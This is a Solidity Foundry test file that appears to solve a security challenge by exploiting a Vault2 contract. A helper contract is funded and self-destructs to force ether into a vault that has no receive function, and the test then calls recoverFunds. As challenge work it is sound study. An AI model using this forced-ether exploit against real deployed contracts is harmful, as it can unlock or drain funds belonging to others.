// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.11;

import "forge-std/console.sol";
import "forge-std/Test.sol";
import "../src/Vault2.sol";

contract SelfDestruct {

     /// We create a contract selfdestruct to attack the vault. The reason is the vault´s contract does not have receive or fallback function.
     /// Let´s add receive function to allow it to receive ether
     receive() external payable {}

  
     /// Function to make this contract destroy itself and send its balance to address "receiver"  
     function close(address receiver) public {
        selfdestruct(payable(receiver));
     }
   } 

contract Vault2Test is Test {
    Vault2 public vault;
    SelfDestruct public selfdestructor;
    address public bob;

    function setUp() public {
        vault = new Vault2{value: 0.0001 ether}();
        selfdestructor = new SelfDestruct();
    }
    function testunlockVault() public {

        bob = makeAddr("bob");
        vm.startPrank(bob);
        vm.deal(bob, 10 ether);

        /// Sending some eth to selfdestruct contract
        (bool sent1, ) = address(selfdestructor).call{value: 3 ether}("");
        require(sent1, "Fail ether transfer");    

        /// Destroy the contract
        selfdestructor.close(address(vault));

        /// We recover the funds 
        vault.recoverFunds();
        console.log("Balance", vault.balance());
    }
}
